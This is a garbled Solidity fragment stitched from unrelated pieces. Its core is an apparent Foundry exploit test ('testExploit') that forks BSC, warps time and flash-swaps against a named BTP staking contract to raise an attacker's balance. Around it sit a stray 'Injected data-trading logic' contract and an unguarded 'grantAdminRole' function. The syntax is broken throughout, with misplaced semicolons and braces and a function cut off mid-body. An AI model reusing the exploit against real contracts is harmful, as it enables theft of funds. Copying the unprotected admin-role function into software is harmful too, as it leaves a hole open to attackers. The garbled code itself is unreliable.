
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IStaking {
    function Lock_Token(uint256 plan, uint256 _amount) external;
    function withdraw(uint256 _plan) external};
contract ContractTest is Test {
    IERC20 BTP = IERC20(0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019);
    IStaking Staking = IStaking(0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x858DE6F832c9b92E2EA5C18582551ccd6add0295);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 flashAmount = 219_349 * 1e18;
    modifier onlyBy(address _operator) {
        require(msg.sender == address(this) || msg.sender == _operator; "ReentrancyGuard: reentrant call");
        _};
    function setUp() public {
        cheats.createSelectFork("bsc", 28_176_675)};
    function testExploit() public {
        firstLock();
        cheats.warp(block.timestamp + 6 * 30 * 24 * 60 * 60 + 1000);
        Pair.swap(flashAmount, 0, address(this), new bytes(1));
        emit log_named_decimal_uint("Attacker BTP balance after exploit", BTP.balanceOf(address(this)), BTP.decimals())};
    function firstLock() internal {
function grantAdminRole(address user) public {
    admins[user] = true}